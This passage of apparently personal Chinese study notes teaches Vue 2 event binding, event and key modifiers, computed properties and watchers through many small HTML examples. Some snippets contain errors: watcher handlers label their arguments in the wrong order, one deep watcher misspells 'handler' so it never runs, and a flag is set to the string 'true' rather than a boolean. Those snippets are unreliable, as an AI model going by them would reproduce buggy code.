		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>欢迎来到{{schoolName}}学习</h2>
			<!-- 当button被点击时，执行vm对象中showInfo函数 -->
			<!-- showInfo函数必须写在vm对象的methods属性中 -->
			<!-- @click是简写写法 -->
			<button @click="showInfo">点我提示信息</button>
		</div>
		
		<script>
			// 在Vue中，将data对象和vm对象进行数据代理，vm对象中可以访问data中的属性，也可以修改data中的属性值
			const vm = new Vue({
				el:'#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					// 点击事件的回调函数会将点击事件对象event传入函数中
					// 注意，所有被Vue管理的函数必须写成普通函数形式
					showInfo(event) {
						console.log(this) // vue对象
					}
				}
			})
		</script>
	</body>
</html>
```
```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>欢迎来到{{schoolName}}学习</h2>
			<!-- 当button被点击时，执行vm对象中showInfo函数 -->
			<!-- showInfo函数必须写在vm对象的methods属性中 -->
			<!-- @click是简写写法 -->
			<!-- 希望调用showInfo中，向函数传入一个数字,可以写成showInfo(66)，66会传入函数中 -->
			<button @click="showInfo(66)">点我提示信息</button>
		</div>
		
		<script>
			// 在Vue中，将data对象和vm对象进行数据代理，vm对象中可以访问data中的属性，也可以修改data中的属性值
			const vm = new Vue({
				el:'#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					// 点击事件的回调函数会将点击事件对象event传入函数中
					// 注意，所有被Vue管理的函数必须写成普通函数形式
					// 点击时，执行showInfo函数
					// 此时，无法接收到event对象
					showInfo(num) {
						console.log(num) // 66
					}
				}
			})
		</script>
	</body>
</html>
```
```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>欢迎来到{{schoolName}}学习</h2>
			<!-- 当button被点击时，执行vm对象中showInfo函数 -->
			<!-- showInfo函数必须写在vm对象的methods属性中 -->
			<!-- @click是简写写法 -->
			<!-- 希望调用showInfo中，向函数传入一个数字,可以写成showInfo(66)，66会传入函数中 -->
			<button @click="showInfo($event, 66)">点我提示信息</button>
		</div>
		
		<script>
			// 在Vue中，将data对象和vm对象进行数据代理，vm对象中可以访问data中的属性，也可以修改data中的属性值
			const vm = new Vue({
				el:'#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					// 点击事件的回调函数会将点击事件对象event传入函数中
					// 注意，所有被Vue管理的函数必须写成普通函数形式
					// 点击时，执行showInfo函数
					showInfo(event,num) {
						console.log(num) // 66
					}
				}
			})
		</script>
	</body>
</html>
```

![image](22A73A10E0B24F86B8DA141C3FEB833B)

Vue会得到methods定义的函数，并进行调用。

---

### 事件修饰符

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>欢迎来到{{schoolName}}学习</h2>
			<!-- 当button被点击时，执行vm对象中showInfo函数 -->
			<!-- showInfo函数必须写在vm对象的methods属性中 -->
			<!-- @click是简写写法 -->
			<!-- 希望调用showInfo中，向函数传入一个数字,可以写成showInfo(66)，66会传入函数中 -->
			<a href="https://www.baidu.com" @click="showInfo()">点我提示信息</a>
		</div>
		
		<script>
			const vm = new Vue({
				el:'#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					showInfo(event,num) {
						alert('同学你好')
					}
				}
			})
		</script>
	</body>
</html>
```

点击a标签时，执行showInfo函数，并跳转到目标网站。

如果我们希望点击a标签时，执行showInfo函数，阻止a标签的默认行为，不跳转到目标网站。可以使用默认修饰符。

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
		</style>
	</head>
	<body>
		<div id="root">
			<h2>欢迎来到{{schoolName}}学习</h2>
			<!-- 当button被点击时，执行vm对象中showInfo函数 -->
			<!-- showInfo函数必须写在vm对象的methods属性中 -->
			<!-- @click是简写写法 -->
			<!-- 希望调用showInfo中，向函数传入一个数字,可以写成showInfo(66)，66会传入函数中 -->
			<a href="https://www.baidu.com" @click.prevent="showInfo()">点我提示信息</a>
		</div>
		
		<script>
			const vm = new Vue({
				el:'#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					showInfo(event,num) {
						alert('同学你好')
					}
				}
			})
		</script>
	</body>
</html>
```

事件修饰符有6个。

![image](7261EDFAA10F4F96AB8BC567B9E4B11B)

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
			.demo {
				height: 50px;
				background-color: pink;
			}
		</style>
	</head>
	<body>
		<div id="root">
			<div class="demo" @click="showInfo()">
				<a href="#" @click="showInfo()">你好</a>
			</div>
		</div>
		
		<script>
			const vm = new Vue({
				el:'#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					showInfo() {
						alert('同学你好')
					}
				}
			})
		</script>
	</body>
</html>
```

点击a，出现事件冒泡。如果想去掉事件冒泡，使用stop修饰符

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
			.demo {
				height: 50px;
				background-color: pink;
			}
		</style>
	</head>
	<body>
		<div id="root">
			<div class="demo" @click="showInfo()">
				<a href="#" @click.stop="showInfo()">你好</a>
			</div>
		</div>
		
		<script>
			const vm = new Vue({
				el:'#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					showInfo() {
						alert('同学你好')
					}
				}
			})
		</script>
	</body>
</html>
```

我们只使用一次，下次点击，不触发点击事件。

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
			
		</style>
	</head>
	<body>
		<div id="root">
			<button @click.once="showInfo()">点我提示信息</button>
		</div>
		
		<script>
			const vm = new Vue({
				el:'#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					showInfo() {
						alert('只显示一次')
					}
				}
			})
		</script>
	</body>
</html>

```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
			.demo {
				height: 50px;
				background-color: pink;
			}
		</style>
	</head>
	<body>
		<div id="root">
			<div class="demo" @click.capture="showInfo(1)">
				<a href="#" @click="showInfo(2)">你好</a>
			</div>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					showInfo(num) {
						console.log(num)
					}
				}
			})
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
			.demo {
				height: 50px;
				background-color: pink;
			}
		</style>
	</head>
	<body>
		<div id="root">
			<div class="demo" @click="showInfo">
				<a href="#" @click.self="showInfo">你好</a>
			</div>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					showInfo(e) {
						console.log(e.target)
					}
				}
			})
		</script>
	</body>
</html>
```

总结

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>修饰符</title>
    <script src="../js/vue.js"></script>
    <style>
        *{
            margin: 20px;
        }
        .demo1{
            height: 100px;
            background: deepskyblue;
        }
        .box1{
            padding: 5px;
            background: deepskyblue;
        }
        .box2 {
            padding: 5px;
            background: orange;
        }
        .list{
            width:200px;
            height: 200px;
            background: salmon;
            overflow: auto;
        }
        .list li{
            height: 100px;
        }
    </style>
</head>
<body>
         <!--
				Vue中的事件修饰符：
						1.prevent：阻止默认事件（常用）；
						2.stop：阻止事件冒泡（常用）；
						3.once：事件只触发一次（常用）；
						4.capture：使用事件的捕获模式；
						5.self：只有event.target是当前操作的元素时才触发事件；
						6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；
		-->
   <div id="root">
       <h1>欢迎来到 {{ name }}</h1>
       <!--阻止默认事件（常用-->
       <a href="https://www.baidu.com" @click.prevent="showInfo" >点我提示信息</a>
       <!--阻止事件冒泡（常用）-->
       <div class="demo1" @click="showInfo">
           <button @click.stop="showInfo">点我提示信息</button>
           <!--修饰符也可以连用，例如下面事例是即阻止冒泡同时也阻止默认行为-->
           <!--<a href="https://www.google.com.tw" @click.prevent.stop="showInfo">谷歌台湾</a>-->
       </div>
       <!--事件只触发一次-->
       <button @click.once="showInfo">点我提示信息,只在第一次点击生效</button>
       <!-- capture事件的捕获模式 让事件以捕获的方式来处理(先捕获再冒泡)-->
       <div class="box1" @click.capture="showMsg(1)">
           div1
           <div class="box2" @click="showMsg(2)">div2</div>
       </div>
       <!-- self 只有event.target是当前操作的元素时才触发事件(变相阻止冒泡)-->
       <div class="demo1" @click.self="showInfo">
           <button @click="showInfo">点我提示信息</button>
       </div>
       <!--passive：事件的默认行为立即执行，无需等待事件回调执行完毕；-->
       <!--scroll滚动条一滚动就会触发的事件 wheel鼠标滚轮事件-->
       <ul class="list" @scroll.passive="demo">
           <li>1</li>
           <li>2</li>
           <li>3</li>
           <li>4</li>
       </ul>
   </div>
   <script type='text/javascript'>
       Vue.config.productionTip = false;
       new Vue({
           el: "#root",
           data(){
               return {
                   name: 'Shanghai'
               }
           },
           methods:{
               showInfo(e){
                   // e.preventDefault(); 阻止a标签默认行为
                   // e.stopPropagation() //阻止事件冒泡
                   // alert('你好');
                   console.log(e.target);
               },
               showMsg(msg){
                   console.log(msg);
               },
               demo(){
                   // console.log(`@`)
                   // for(let i = 0; i < 100000; i++){
                   //     console.log('#')
                   // }
                   // console.log('累了')
               }
           }
       });
   </script>
</body>
</html>
```

---

### 键盘事件

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
			
		</style>
	</head>
	<body>
		<div id="root">
			<!-- 在input框中按下keyup，执行showInfo函数 -->
			<input type="text" name="" id="" placeholder="按下回车，提示输入" @keyup="showInfo">
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					showInfo(event) {
						// 按下回车
						if(event.keyCode == 13){
							console.log('按下了回车')
						}
					}
				}
			})
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
			
		</style>
	</head>
	<body>
		<div id="root">
			<!-- keyup代表在input框中按下keyup，执行showInfo函数 -->
			<!-- keyup.enter代表按下enter建才会执行函数 -->
			<input type="text" name="" id="" placeholder="按下回车，提示输入" @keyup.enter="showInfo">
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					showInfo(event) {
						console.log('按下了回车')
					}
				}
			})
		</script>
	</body>
</html>
```

![image](E953A4B1B11C401CA86801ED46A13653)

总结

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>vue 键盘事件</title>
    <script src="../js/vue.js"></script>
</head>
<body>
     <!--
            1.Vue中常用的按键别名：
                        回车 => enter
                        删除 => delete (捕获“删除”和“退格”键)
                        退出 => esc
                        空格 => space
                        换行 => tab (特殊，必须配合keydown去使用)
                        上 => up
                        下 => down
                        左 => left
                        右 => right

            2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

            3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
                        (1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
                        (2).配合keydown使用：正常触发事件。

            4.也可以使用keyCode去指定具体的按键（不推荐）

            5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
    -->
  <div id="root">
        <!--vue中键盘事件的绑定 一般用keyUp(keydown)-->
        <h1>欢迎来到{{ name }}</h1>
        <input type="text" @keyup.enter="showInfo" placeholder="按下回车提示输入"/>
        <input type="text" @keyup.delete="showInfo" placeholder="退格或删除提示输入"/>
        <input type="text" @keyup.esc="showInfo" placeholder="按下esc提示输入"/>
        <input type="text" @keydown.tab="showInfo" placeholder="按下tab示输入"/>
        <input type="text" @keyup.ctrl="showInfo" placeholder="按下command提示输入"/>
        <input type="text" @keydown.p="showInfo" placeholder="按下p提示输入"/>
        <!--键盘事件的修饰符也可以连用-->
       <input type="text" @keydown.command.g="showInfo" placeholder="按下command和g提示输入"/>
    </div>
    <script type="text/javascript">
        new Vue({
            el:'#root',
            data:{
                name: 'shanghai'
            },
            methods:{
                showInfo:function (e){
                    // if(e.keyCode === 13) {
                    //     console.log(e.target.value);
                    // }
                    console.log(e.target.value);
                    console.log(e.key); //按下的名字
                }
            }
        })
    </script>
</body>
</html>
```

---

### 事件总结

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>
			
		</style>
	</head>
	<body>
		<div id="root">
			<div class="demo" @click="showInfo">
				<!-- @click.stop.prevent代表给点击事件添加阻止冒泡和阻止默认行为 -->
				<a href="#" @click.stop.prevent="showInfo">你好</a>
			</div>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					showInfo(event) {
						console.log('你好')
					}
				}
			})
		</script>
	</body>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>

		</style>
	</head>
	<body>
		<div id="root">
			<div>
				<!-- @keyup.ctrl.y代表按下ctrl+y时调用showInfo函数 -->
				<input type="text" placeholder="按下回车，提示输入" @keyup.ctrl.y="showInfo">
			</div>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					schoolName: '北京大学'
				},
				methods: {
					showInfo(event) {
						console.log('你好')
					}
				}
			})
		</script>
	</body>
</html>
```

---

### 姓名案例

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>

		</style>
	</head>
	<body>
		<!-- 姓名案例--插值语法实现 -->
		<div id="root">
			姓：<input type="text" v-model:value="firstName"><br>
			名：<input type="text" v-model:value="lastName"><br>
			姓名<span>{{firstName}}-{{lastName}}</span>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					firstName: '张',
					lastName: '三'
				}
			})
		</script>
	</body>
</html>
```

方法实现

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>

		</style>
	</head>
	<body>
		<!-- 姓名案例--方法实现 -->
		<div id="root">
			姓：<input type="text" v-model:value="firstName"><br>
			名：<input type="text" v-model:value="lastName"><br>
			<!-- fullName()代表执行vm对象中的fullName函数，返回值 -->
			姓名:<span>{{fullName()}}</span>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					firstName: '张',
					lastName: '三'
				},
				methods: {
					fullName() {
						return this.firstName + '-' + this.lastName
					}
				}
			})
		</script>
	</body>
</html>
```

计算属性实现

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>

		</style>
	</head>
	<body>
		<!-- 姓名案例--计算属性实现 -->
		<div id="root">
			姓：<input type="text" v-model:value="firstName"><br>
			名：<input type="text" v-model:value="lastName"><br>
			姓名:<span>{{fullName}}</span>
			姓名:<span>{{fullName}}</span>
			姓名:<span>{{fullName}}</span>
			姓名:<span>{{fullName}}</span>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					firstName: '张',
					lastName: '三'
				},
				computed: {
					// 1、初次读取fullName发生变化时，get函数被调用，并将fullName的值缓存
					// 2、当get函数中依赖的数据发生变化是，get函数被调用
					fullName:{
						get() {
							console.log('get被调用')
							return this.firstName + '-' + this.lastName
						}
					}
				},
			})
		</script>
	</body>
</html>
```

vm中缓存了fullName的值

![image](6D3DE4637F97457FAA96ABCAEB25D476)

![image](21D8C249ADD14195A835AE5F6C267667)

---

### 计算属性简写

一般情况下，计算属性很少被修改，可以使用简写写法

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>

		</style>
	</head>
	<body>
		<!-- 姓名案例--计算属性实现 -->
		<div id="root">
			姓：<input type="text" v-model:value="firstName"><br>
			名：<input type="text" v-model:value="lastName"><br>
			
			姓名:<span>{{fullName}}</span>
		</div>

		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					firstName: '张',
					lastName: '三'
				},
				computed: {
					// 简写写法，当读取fullName时，调用fullName函数，得到值
					fullName() {
						console.log('get被调用')
						return this.firstName + '-' + this.lastName
					}
				},
			})
		</script>
	</body>
</html>
```

---

### 监视属性

![image](4C3EEE58CADF497EA44AEEA28AA51CD4)

天气案例

插值语法

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>

		</style>
	</head>
	<body>
		<!-- 天气案例 -->
		<div id="root">
			<h2>今天天气很{{ishot ? '炎热':'凉爽'}}</h2>
			<button>切换天气</button>
		</div>
		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					ishot: 'true'
				}
			})
		</script>
	</body>
</html>
```

计算属性写法

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>

		</style>
	</head>
	<body>
		<!-- 天气案例 -->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button>切换天气</button>
		</div>
		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					ishot: 'true'
				},
				computed: {
					info() {
						let weather = this.ishot ? '炎热' : '凉爽'
						return weather
					}
				}
			})
		</script>
	</body>
</html>
```

另一种写法

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>

		</style>
	</head>
	<body>
		<!-- 天气案例 -->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="ishot = !ishot">切换天气</button>
		</div>
		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					ishot: 'true'
				},
				computed: {
					info() {
						let weather = this.ishot ? '炎热' : '凉爽'
						return weather
					}
				}
			})
		</script>
	</body>
</html>
```

总结

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>vue计算属性语法实现</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <!--
			计算属性：
					1.定义：要用的属性不存在，要通过已有属性计算得来。
					2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
					3.get函数什么时候执行？
								(1).初次读取时会执行一次。
								(2).当依赖的数据发生改变时会被再次调用。
					4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
					5.备注：
							1.计算属性最终会出现在vm上，直接读取使用即可。
							2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
		 -->
    <!--v-model双向绑定-->
    姓:<input type="text" v-model="firstName"/>
    <br/><br/>
    名:<input type="text" v-model="lastName"/>
    <br/><br/>
    测试:<input type="text" v-model="test"/>
    <br/><br/>
    全名: <span>{{ fullName }}</span>
</div>
<script type="text/javascript">
    const vm = new Vue({
        el: '#root',
        data: {
            //data里的都是属性
            firstName: '张',
            lastName: '三',
            test:'test'
        },
        //计算属性--> 旧属性加工
        computed: {
            fullName: {
                //get的作用，当读取fullName时get就会被调用，且返回值就做为fullName的值
                //defineProperty
                //注意vm._data是不存在计算属性的
                //计算属性算完之后直接丢到了viewModel实例对象身上
                /**
                 * get的调用时机
                 * 1.初次读取计算属性时
                 * 2.所依赖的数据(data中的属性)发生变化时，不改变的话直接读缓存
                 * 3.methods没有缓存，读几次就调用几次无论要用的数据是否发生变化
                 *  @returns {string}
                 */
                get(){
                    //此时get函数中的this指向是vm
                    console.log('get调用了', this);
                    return this.firstName + '--' + this.lastName
                },
                /**
                 * set什么时候调用
                 *   1.当fullName被修改时
                 * @param value
                 */
                set(value){
                    //修改计算属性所依赖的普通属性(放在data里面的)
                    //this === vm
                    const [ firstName, lastName ] = value.split('-');
                    this.firstName = firstName;
                    this.lastName = lastName; //依赖属性发生改变之后,计算属性自动改变
                }
            }
        }
    });
</script>
</body>
</html>
```

### 监视属性

计算属性实现

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>天气案例</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h1>今天天气很 {{ info }}</h1>
    <!--点击函数里面可以书写较为简单的语句-->
    <!--@xxx='yyyy' yyyy可以是一些简单的语句-->
<!--    <button @click="isHot = !isHot">-->
<!--        切换-->
<!--    </button>-->
    <button @click="changeWeather">
        切换
    </button>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    new Vue({
        el:'#root',
        data:{
            isHot: true
        },
        //计算属性
        computed: {
            info(){
                return this.isHot ? '炎热' : '凉爽';
            }
        },
        //改变模版数据的方法
        methods:{
            changeWeather(){
                this.isHot = !this.isHot;
            }
        }
    })</script>
</body>
</html>
```

监视属性写法

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>

		</style>
	</head>
	<body>
		<!-- 天气案例 -->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
		</div>
		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					ishot: 'true'
				},
				methods: {
					changeWeather() {
						this.ishot = !this.ishot
					}
				},
				computed: {
					info() {
						let weather = this.ishot ? '炎热' : '凉爽'
						return weather
					}
				},
				watch: {
					// 监视哪一个变量
					ishot: {
						// 初始化时,让handler函数调用，即使ishot未发生改变
						immediate: true,
						// 当ishot发生改变时调用
						handler(oldValue, newValue) {
							console.log('ishot被修改')
							console.log('原来值是' + oldValue)
							console.log('后来值是' + newValue)
						}
					}
				}
			})
		</script>
	</body>
</html>
```

计算属性也可以被监视

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>

		</style>
	</head>
	<body>
		<!-- 天气案例 -->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
		</div>
		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					ishot: 'true'
				},
				methods: {
					changeWeather() {
						this.ishot = !this.ishot
					}
				},
				computed: {
					info() {
						let weather = this.ishot ? '炎热' : '凉爽'
						return weather
					}
				},
				watch: {
					// 监视哪一个变量
					info: {
						// immediate设置为true时，初始化时,让handler函数调用，即使ishot未发生改变
						immediate: true,
						// 当ishot发生改变时调用
						handler(oldValue, newValue) {
							console.log('isfo被修改')
							console.log('原来值是' + oldValue)
							console.log('后来值是' + newValue)
						}
					}
				}
			})
		</script>
	</body>
</html>
```

监视属性的另一种写法

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>

		</style>
	</head>
	<body>
		<!-- 天气案例 -->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
		</div>
		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					ishot: 'true'
				},
				methods: {
					changeWeather() {
						this.ishot = !this.ishot
					}
				},
				computed: {
					info() {
						let weather = this.ishot ? '炎热' : '凉爽'
						return weather
					}
				}
			})
			// 监视变量
			vm.$watch('ishot', {
				// 初始化时,让handler函数调用，即使ishot未发生改变
				immediate: true,
				// 当ishot发生改变时调用
				handler(oldValue, newValue) {
					console.log('ishot被修改')
					console.log('原来值是' + oldValue)
					console.log('后来值是' + newValue)
				}
			})
		</script>
	</body>
</html>
```

![image](45926E37658E45CA923EA685276F4F8B)

总结

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>天气案例_监视属性</title>
    <script src="../js/vue.js"></script>
</head>
<body>
<div id="root">
         <!--
				监视属性watch：
					1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作
					2.监视的属性必须存在，才能进行监视！！
					3.监视的两种写法：
							(1).new Vue时传入watch配置
							(2).通过vm.$watch监视
		 -->
    <h1>今天天气很 {{ info }}</h1>
    <button @click="changeWeather">
        切换
    </button>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false;
    const vm = new Vue({
        el:'#root',
        data:{
            isHot: true
        },
        //计算属性
        computed: {
            info(){
                return this.isHot ? '炎热' : '凉爽';
            }
        },
        //改变模版数据的方法
        methods:{
            changeWeather(){
                this.isHot = !this.isHot;
            }
        },
        // watch:{
        //     //监视的配置对象
        //     //watch不仅能监视data的普通属性，也可以检测计算属性
        //     isHot:{
        //         immediate: true, //当这个属性为true时，页面刚渲染就运行handler函数
        //         //handler 什么时候调用呢
        //         //当isHot发生改变就会调用该函数
        //         //handler接收两个参数，一个是这个状态参数改变前的值，另一个是改变后的旧值
        //         handler(newValue, preValue){
        //             console.log('ishot 被修改了');
        //             console.log(`newValue: ${newValue}, preValue: ${preValue}`);
        //         }
        //     }
        // }
    });
    //watch的第二种写法，直接采用vm对象实例
    vm.$watch('isHot', {
        immediate: true, //当这个属性为true时，页面刚渲染就运行handler函数
        //handler 什么时候调用呢
        //当isHot发生改变就会调用该函数
        //handler接收两个参数，一个是这个状态参数改变前的值，另一个是改变后的旧值
        handler(newValue, preValue){
            console.log('ishot 被修改了');
            console.log(`newValue: ${newValue}, preValue: ${preValue}`);
        }
    });
</script>
</body>
</html>
```

---

### 深度监视

```
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<script type="text/javascript" src="Vue/vue.js"></script>
		<title>Document</title>
		<style>

		</style>
	</head>
	<body>
		<div id="root">
			<h2>x的值是：{{number.x}}</h2>
			<button @click="number.x++">
				点我让x加1
			</button>
		</div>
		<script>
			const vm = new Vue({
				el: '#root',
				data: {
					number: {
						x:1,
						y:2
					}
				},
				watch: {
					// 希望监视到number中不管x还是y发生变化
					number: {
						deep: true,
						hanlder(oldValue, newValue) {
							console.log('number发生改变')
						}
					}
				}
			})
		</script>
	</body>
</html>
```

![image](30AE3C271C884E90AD644C4AA6C9C30C)

案例

```
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>天气案例_深度监视</title>
